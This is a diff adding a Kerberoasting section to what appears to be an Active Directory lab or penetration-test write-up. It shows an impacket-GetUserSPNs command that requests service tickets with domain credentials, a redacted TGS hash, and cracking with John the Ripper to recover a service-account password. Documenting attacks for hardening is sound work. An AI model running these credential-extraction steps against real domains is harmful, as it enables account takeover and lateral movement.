@@ -118,7 +118,38 @@ Recovered Password: `P@ssword123!`
 Status: SUCCESS.
 
 ### 2.3 Privilege Escalation via Kerberoasting
-(Pending documentation)
+With valid domain credentials (`victim.asrep`), the focus shifted to service-oriented attacks. Kerberoasting targets Service Principal Names (SPNs) to extract service account ticket hashes for offline cracking.
+
+### 2.3.1 Service Discovery and Ticket Extraction
+The `GetUserSPNs` tool was utilized to enumerate accounts with registered SPNs and request a Service Ticket (TGS). 
+
+```bash
+impacket-GetUserSPNs company.local/victim.asrep:P@ssword123! -dc-ip 192.168.0.25 -request
+```
+Results:
+
+Target Account: `svc_sql`
+
+Service: `MSSQLSvc/sql01.company.local:1433`
+
+Hash Type: Kerberos 5 TGS-REP (etype 23)
+
+Extraction Output (Truncated):
+`$krb5tgs$23$*svc_sql$COMPANY.LOCAL$company.local/svc_sql*$bb30c60...[REDACTED]...ee2c084`
+
+### 2.3.2 Password Cracking (Kerberoasting)
+The service ticket (TGS) hash was cracked offline using `John the Ripper`. Recovering the plain-text password of a service account is a high-impact event, as these accounts often have elevated privileges or lead to lateral movement opportunities.
+
+```bash
+john --wordlist=pass.txt hashes.kerberoast
+```
+Cracking Results:
+
+Service Account: `svc_sql`
+
+Recovered Password: `P@ssword123!`
+
+Status: SUCCESS.
 
 ## Phase 3: Hardening and Remediation
 This section will contain the security controls and PowerShell scripts required to remediate the identified vulnerabilities and monitor for similar attack patterns.
